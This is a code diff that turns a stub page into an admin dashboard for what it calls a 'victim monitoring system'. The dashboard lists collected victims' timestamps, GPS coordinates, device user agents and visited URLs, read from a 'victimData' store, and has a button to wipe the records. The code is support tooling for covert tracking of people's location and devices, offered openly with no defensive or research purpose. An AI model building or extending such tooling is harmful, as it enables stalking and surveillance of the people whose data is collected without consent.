@@ -1,11 +1,114 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Collect Data</title>
+    <title>Collect Data - Admin Panel</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+            background: #f9f9f9;
+        }
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        h1 { color: #333; }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 20px;
+        }
+        th, td {
+            padding: 12px;
+            text-align: left;
+            border-bottom: 1px solid #ddd;
+        }
+        th {
+            background-color: #f2f2f2;
+            font-weight: bold;
+        }
+        tr:hover {
+            background-color: #f5f5f5;
+        }
+        .no-data {
+            text-align: center;
+            color: #666;
+            font-style: italic;
+        }
+        button {
+            padding: 10px 20px;
+            background: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 10px 0;
+        }
+        button:hover {
+            background: #45a049;
+        }
+    </style>
 </head>
 <body>
-    <h1>Collect Data Endpoint</h1>
-    <p>This is the data collection endpoint for your victim monitoring system.</p>
-    <p>POST data to this endpoint to store victim information.</p>
+    <div class="container">
+        <h1>Collect Data - Admin Panel</h1>
+        <p>Victim data collection dashboard</p>
+
+        <button onclick="loadData()">Refresh Data</button>
+        <button onclick="clearData()">Clear All Data</button>
+
+        <div id="data-container">
+            <p class="no-data">No data collected yet</p>
+        </div>
+    </div>
+
+    <script>
+        // Load data from localStorage
+        function loadData() {
+            const data = JSON.parse(localStorage.getItem('victimData') || '[]');
+            const container = document.getElementById('data-container');
+
+            if (data.length === 0) {
+                container.innerHTML = '<p class="no-data">No data collected yet</p>';
+                return;
+            }
+
+            let html = '<table><tr><th>Date</th><th>Location</th><th>Device</th><th>URL</th></tr>';
+
+            data.forEach(item => {
+                const date = new Date(item.timestamp).toLocaleString();
+                const location = item.location ?
+                    `Lat: ${item.location.latitude.toFixed(4)}, Lng: ${item.location.longitude.toFixed(4)}` :
+                    'N/A';
+
+                html += `<tr>
+                    <td>${date}</td>
+                    <td>${location}</td>
+                    <td>${item.device.userAgent.substring(0, 50)}...</td>
+                    <td>${item.url.substring(0, 30)}...</td>
+                </tr>`;
+            });
+
+            html += '</table>';
+            container.innerHTML = html;
+        }
+
+        // Clear all data
+        function clearData() {
+            if (confirm('Are you sure you want to clear all collected data?')) {
+                localStorage.removeItem('victimData');
+                loadData();
+            }
+        }
+
+        // Initialize
+        window.onload = function() {
+            loadData();
+        };
+    </script>
 </body>
 </html>
